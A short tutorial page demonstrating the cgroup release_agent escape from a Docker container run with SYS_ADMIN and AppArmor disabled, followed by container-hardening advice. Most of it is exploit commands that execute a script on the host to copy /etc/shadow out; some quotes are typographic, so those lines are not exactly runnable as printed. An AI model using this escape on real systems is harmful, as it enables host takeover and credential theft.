# Escaping from a Docker container

### SYS\_ADMIN capability and AppArmor disabled

{% hint style="info" %}
Note that these aren't default settings
{% endhint %}

```text
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

Then in the container, we are going to run these commands. 

```text
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n ‘s/.*\perdir=\([^,]*\).*/\1/p’ /etc/mtab`
echo “$host_path/cmd” > /tmp/cgrp/release_agent
echo ‘#!/bin/sh’ > /cmd
echo “cat /etc/shadow > $host_path/shadow” >> /cmd
chmod a+x /cmd
sh -c “echo \$\$ > /tmp/cgrp/x/cgroup.procs”
```

Once you execute the above commands, you can see the host OS’s passwords in /shadow folder

```text
cat /shadow
```

As we can see we were able to break out of the container. Suffice to say, we abused misconfigurations to escape a container.  
This wouldn’t have happened if the non-root user was used, SYS\_ADMIN and AppArmor profile wasn’t disabled.  
In short,

1. Do not use –privileged flag, it disables all the security mechanisms placed by docker.
2. Do not mount root volumes into the containers.
3. Do not mount docker.sock inside the containers.
4. Default docker settings are sane, please do not disable them or add more capabilities.
5. Use SecComp and AppArmor profiles to harden the container.
6. Do not run containers as the root user.

